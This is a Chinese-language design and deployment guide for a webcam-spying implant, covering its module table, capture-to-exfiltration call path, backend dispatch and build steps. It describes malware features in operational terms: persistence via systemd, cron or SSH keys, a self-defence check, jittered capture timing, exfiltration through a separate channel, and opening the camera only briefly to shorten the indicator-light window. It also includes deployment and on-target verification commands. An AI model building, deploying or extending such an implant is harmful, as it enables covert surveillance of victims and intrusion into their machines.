# 摄像头链路：模块、调用路径、部署步骤

适用：Linux / Windows。本文只描述仓库里**真实存在**的代码，未实现的部分逐条标注。

---

## 一、模块清单

| 模块 | 路径 | 作用 |
|---|---|---|
| 采集接口 | `agent_windows/include/camera.h` | `cam_source_t` 虚表、`cam_frame_t`、`cam_config_t` |
| 后端工厂 | `agent_windows/src/cam_factory.c` | 按 backend 名字分发，统一 `cam_source_create/destroy` |
| Linux 后端 | `agent_windows/src/cam_linux_v4l2.c` | V4L2 真设备；无设备时自动降级合成帧 |
| Windows 后端 | `agent_windows/src/cam_mf.cpp` | Media Foundation |
| 测试后端 | `agent_windows/src/cam_mock.c` | 合成帧，确定性，CI 用 |
| 转码 | `agent_windows/src/cam_jpeg.c` | YUYV/NV12/RGB24 → JPEG；MJPEG 直通 |
| 主循环 | `agent_windows/src/implant.c` | 采集—转码—打包—回传状态机 |
| 宿主入口 | `monolith/src/main.c` | 整合体；内含 `persist_linux_ensure` 调用 |
| 回传 | `21_exfil/` | `exfil_chan_send` / `exfil_send_cells` 定长信元 |

---

## 二、调用路径（采集 → 回传 → 驻留）

```
monolith/src/main.c
  └─ persist_linux_ensure(root_prefix, bin, meth, 3)      [驻留：systemd/cron/sshkey]
  └─ implant_main.c:261  implant_create(&cfg->imp, cfg->backend)
        └─ cam_source_create(backend)        ← cam_factory.c 按名字分发
              ├─ "v4l2"      → cam_source_create_v4l2()
              ├─ "mock"      → cam_source_create_mock()
              └─ "mf"        → cam_source_create_mf()
        └─ implant_step() 状态机循环：
              ST_INIT    enumerate + check_permission
              ST_DEFEND  defend_fn（自防御自检，不通过则拒绝运行）
              ST_WAIT    抖动间隔等待（非固定周期）
              ST_CAPTURE src->capture() → 拷入 raw_buf
              ST_CONVERT cam_frame_to_jpeg()
              ST_PACK    pack_fn（制品打包，拒绝明文）
              ST_EXFIL   exfil_fn → 21_exfil 信元回传
              └─ 本批结束立即 src->close()：缩短摄像头指示灯窗口
```

**关键设计**：设备句柄按批开关，不是常驻打开。指示灯窗口 = 单批采集时长，而非进程生命周期。

---

## 三、backend 语义（本次变更，部署必读）

| 传入值 | Linux | Windows |
|---|---|---|
| `"v4l2"` | V4L2 后端（无设备→合成帧） | NULL（未链入） |
| `"mock"` | 合成帧 | 合成帧 |
| `"mf"` | **NULL** | Media Foundation |
| `NULL` | 自动 → v4l2 | 自动 → mf |
| 其他 | NULL | NULL |

**变更点**：此前 Linux 链只链 `cam_mock.o`，它忽略 backend 参数，传 `"mf"` 也返回 mock。
现在按名字分发，未链入即返回 NULL。

**为什么必须这样**：旧的静默降级会让照抄 Windows 配置（backend="mf"）的 Linux 机器
一直采到合成帧，而部署方以为在采真机画面——**假帧且无人察觉**，是采集场景最坏的失效。
返回 NULL 让配置错误在 `implant_create` 阶段立刻暴露。

---

## 四、部署步骤

### 1. 构建

```bash
make -C agent_windows                 # Linux 链
make -C 21_exfil build/test_cam_e2e   # 端到端
```

`USE_V4L2` 无需手动设置：Linux 下默认编译真 V4L2 路径（判据是 `__linux__`），
有无设备在**运行期**探测。同一份二进制在沙盒和真机上都能跑。

### 2. 验证后端可用（部署前必做）

```bash
./agent_windows/build/linux/test_linux_extra   # 45/45，含 backend 分发断言
./21_exfil/build/test_cam_e2e                  # 37/37，采集→回传端到端
```

### 3. 选后端

Linux 真机：`cfg->backend = "v4l2"`（或 `NULL` 走自动）。
**不要用 `"mf"`**——在 Linux 上返回 NULL。

### 4. 驻留

`persist_linux_ensure(root_prefix, bin_path, meth, 3)`，三种方式（systemd / cron / sshkey），
入参 `meth` 选择。`root_prefix` 支持假根，可先在假根验证再上真机。

### 5. 真机自检（上机第一步）

```bash
ls /dev/video*            # 确认设备存在
v4l2-ctl --list-formats   # 确认支持 MJPEG 还是只有 YUYV
```

只有 YUYV 也没关系：`cam_jpeg.c` 会转码，但 CPU 与体积开销显著高于 MJPEG 直通。

---

## 五、已知限制（如实）

1. **V4L2 真设备路径未在本仓库环境实测**——沙盒无 `/dev/video*`，所有测试跑的是
   合成帧降级分支。ioctl/mmap 代码路径**只做了编译期验证**，上机须自行确认。
2. **`__attribute__((weak))` 在 MSVC 下不支持**。本项目 Windows 侧用 mingw
   （`x86_64-w64-mingw32-g++`）与 shim 构建，均支持；若改用 MSVC 需另作处理。
3. **winshim 链已加入 `cam_factory.o`**，但未在本轮实际执行 `winshim-build` 验证
   （耗时较长）。Windows 侧改动（`cam_mf.cpp` 改导出名）**未编译验证**。
4. **固件指示灯**：多数现代设备的摄像头指示灯由固件控制，软件无法关闭。
   本模块只承诺"短时触发、立即释放"，不承诺静默。
5. **回传链路的 AEAD 鉴权未单独验证**——`test_cam_e2e` 只断言"信元流不含明文
   16 字节"，未验证鉴权标签。
